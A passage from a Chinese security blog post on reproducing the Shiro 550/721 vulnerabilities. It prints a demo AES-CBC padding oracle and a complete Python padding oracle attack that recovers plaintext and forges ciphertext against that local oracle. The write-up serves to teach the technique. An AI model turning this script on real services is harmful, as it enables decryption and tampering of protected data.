class="hljs-built_in">bytes</span></span>):<br>        pad_plain = cls.__pad(plain)<br>        aes = AES.new(mode=AES.MODE_CBC, key=cls.KEY, iv=cls.IV)<br>        cipher = aes.encrypt(pad_plain)<br>        hexdump(cipher)<br>        <span class="hljs-keyword">return</span> cipher<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cls, cipher: <span class="hljs-built_in">bytes</span></span>):<br>        aes = AES.new(mode=AES.MODE_CBC, key=cls.KEY, iv=cls.IV)<br>        pad_plain = aes.decrypt(cipher)<br>        <span class="hljs-keyword">return</span> cls.__unpad(pad_plain)<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_without_result</span>(<span class="hljs-params">cls, cipher: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            cls.decrypt(cipher)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-comment"># print(e)</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-keyword">return</span> POA.encrypt(plain)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cipher = test()<br>    plain = POA.decrypt(cipher)<br>    <span class="hljs-built_in">print</span>(plain)<br><br>    IPython.embed()<br></code></pre></td></tr></table></figure>

<p>poa_attack.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> pdb<br><br><span class="hljs-keyword">from</span> poa <span class="hljs-keyword">import</span> test, POA<br><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> IPython<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PaddingOracleAttack</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, cipher, iv</span>):<br>        self.cipher = cipher<br><br>        <span class="hljs-comment"># 把密文分割成列表，每个列表元素16字节</span><br>        self.cipher_lst = self.split_block(self.cipher)<br><br>        <span class="hljs-comment"># 解密的中间值</span><br>        self.mid_lst = [self.brute_middle(self.cipher_lst[-<span class="hljs-number">1</span>])]<br><br>        <span class="hljs-comment"># 存储计算出来的明文</span><br>        self.plain_lst = [[] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> self.cipher_lst]<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">split_block</span>(<span class="hljs-params">cls, cipher</span>):<br>        cipher_list = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher), <span class="hljs-number">16</span>):<br>            cipher_list.append(cipher[i: i + <span class="hljs-number">16</span>])<br>        <span class="hljs-keyword">return</span> cipher_list<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_new_tail</span>(<span class="hljs-params">self, tail, idx</span>):<br>        new_tail = <span class="hljs-string">b&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tail:<br>            _tail = t ^ (idx - <span class="hljs-number">1</span>) ^ idx<br>            new_tail += _tail.to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&quot;big&quot;</span>)<br>        <span class="hljs-keyword">return</span> new_tail<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_middle</span>(<span class="hljs-params">self, cipher_line</span>):<br>        <span class="hljs-string">&#x27;&#x27;&#x27;暴力破解解密的中间值&#x27;&#x27;&#x27;</span><br>        tail = <span class="hljs-string">b&quot;&quot;</span><br>        mid_lst = []<br>        <span class="hljs-comment"># 从pad 为0x01开始 到 0x10</span><br>        <span class="hljs-keyword">for</span> pad <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">17</span>):<br><br>            <span class="hljs-comment"># 计算新的pad尾部，因为每计算出来一个pad，再往前计算新的pad的时候，尾部的每一个值异或出来都要放大1位。</span><br>            tail = self.calc_new_tail(tail, pad)<br><br>            find_pad = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>):<br>                <span class="hljs-comment"># 形成2个密文块</span><br>                cipher = <span class="hljs-string">b&quot;\x00&quot;</span> * (<span class="hljs-number">16</span> - pad) + i.to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&quot;big&quot;</span>) + tail + cipher_line<br>                <span class="hljs-keyword">if</span> POA.decrypt_without_result(cipher):<br>                    <span class="hljs-comment"># print(&quot;[!] Cipher - %s&quot; % cipher)</span><br>                    find_pad = <span class="hljs-literal">True</span><br>                    tail = i.to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&quot;big&quot;</span>) + tail<br><br>                    mid_chr = i ^ pad<br>                    mid_lst.insert(<span class="hljs-number">0</span>, mid_chr)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> find_pad:<br>                <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Error not find pad!&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(mid_lst)<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__pad</span>(<span class="hljs-params">cls, text: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;PKCS7 padding&quot;&quot;&quot;</span><br>        text_length = <span class="hljs-built_in">len</span>(text)<br>        amount_to_pad = AES.block_size - (text_length % AES.block_size)<br>        <span class="hljs-keyword">if</span> amount_to_pad == <span class="hljs-number">0</span>:<br>            amount_to_pad = AES.block_size<br>        pad = <span class="hljs-built_in">chr</span>(amount_to_pad).encode()<br>        <span class="hljs-keyword">return</span> text + pad * amount_to_pad<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake</span>(<span class="hljs-params">self, plain, cipher=<span class="hljs-literal">None</span>, mid=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&#x27;&#x27;&#x27;伪造</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :plain: 要伪造的明文</span><br><span class="hljs-string">        :last_cipher: 一个密文块</span><br><span class="hljs-string">        :last_mid:  密文块解密出来的中间值</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        pad_plain = self.__pad(plain)<br>        plain_lst = self.split_block(pad_plain)<br>        mid = mid <span class="hljs-keyword">if</span> mid <span class="hljs-keyword">else</span> self.mid_lst[-<span class="hljs-number">1</span>]<br><br>        cipher = [cipher <span class="hljs-keyword">if</span> cipher <span class="hljs-keyword">else</span> self.cipher_lst[-<span class="hljs-number">1</span>]]<br><br>        <span class="hljs-comment"># 从最后开始计算</span><br>        <span class="hljs-keyword">for</span> plain <span class="hljs-keyword">in</span> plain_lst[::-<span class="hljs-number">1</span>]:<br>            need_iv = <span class="hljs-string">b&quot;&quot;</span><br>            <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plain)):<br>                _m = mid[idx]<br>                _p = plain[idx]<br>                need_iv += (_m ^ _p).to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&quot;big&quot;</span>)<br><br>            mid = self.brute_middle(need_iv)<br>            cipher.insert(<span class="hljs-number">0</span>, need_iv)<br><br>        <span class="hljs-keyword">return</span> cipher[<span class="hljs-number">0</span>], <span class="hljs-string">b&#x27;&#x27;</span>.join(cipher[<span class="hljs-number">1</span>:])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&#x27;&#x27;&#x27;解密&#x27;&#x27;&#x27;</span><br>        <span class="hljs-comment"># 从最后开始计算</span><br>        self.mid_lst = []<br>        <span class="hljs-keyword">for</span> _idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(self.cipher_lst), <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            line_idx = _idx - <span class="hljs-number">1</span><br>            cipher_line = self.cipher_lst[line_idx]<br><br>            <span class="hljs-keyword">if</span> line_idx &gt;= <span class="hljs-number">1</span>:<br>                <span class="hljs-comment"># 获取上一行密文数据，因为每一行的明文加密之前需要与上一行的密文异或</span><br>                p_cipher_line = self.cipher_lst[line_idx - <span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 如果是第一行，则其与IV异或</span><br>                p_cipher_line = iv<br><br>            _mid = self.brute_middle(cipher_line)<br>            self.mid_lst.insert(<span class="hljs-number">0</span>, _mid)<br>            <span class="hljs-keyword">for</span> idx, _m <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(_mid):<br>                plain_chr = _m ^ p_cipher_line[idx]<br>                self.plain_lst[line_idx].append(plain_chr)<br><br>        plain = <span class="hljs-string">b&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> self.plain_lst:<br>            plain += <span class="hljs-built_in">bytes</span>(p)<br><br>        <span class="hljs-keyword">return</span> plain<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cipher = test()     <span class="hljs-comment"># 获取密文</span><br>    iv = POA.IV         <span class="hljs-comment"># 获取初始化向量</span><br><br>    poa_atck = PaddingOracleAttack(cipher, iv)<br>    new_iv, new_cipher = poa_atck.fake(<span class="hljs-string">b&quot;wo ai beijing tianan men!&quot;</span>)<br>    plain = poa_atck.decrypt()<br><br>    IPython.embed()<br></code></pre></td></tr></table></figure>

<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a><strong>结语</strong></h2><p>经典通过错误响应的反馈进行的攻击</p>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html">https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html</a></li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/CVE%E5%A4%8D%E7%8E%B0/" class="print-no-link">#CVE复现</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Shiro550、721漏洞复现</div>
      <div>http://example.com/2025/02/19/shiro550、721漏洞复现/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年2月19日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/03/25/CVE-2019-0211%20Apache%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="CVE-2019-0211 Apache提权漏洞复现">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CVE-2019-0211 Apache提权漏洞复现</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/02/19/%E5%9F%9F%E3%80%81%E5%9F%9F%E6%8E%A7/" title="域、域控">
                        <span class="hidden-mobile">域、域控</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"skSyD5RSTq4kiWeAhMeeY9ib-gzGzoHsz","appKey":"rQPg4V1fSy3hOP8QAyeJnyh8","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
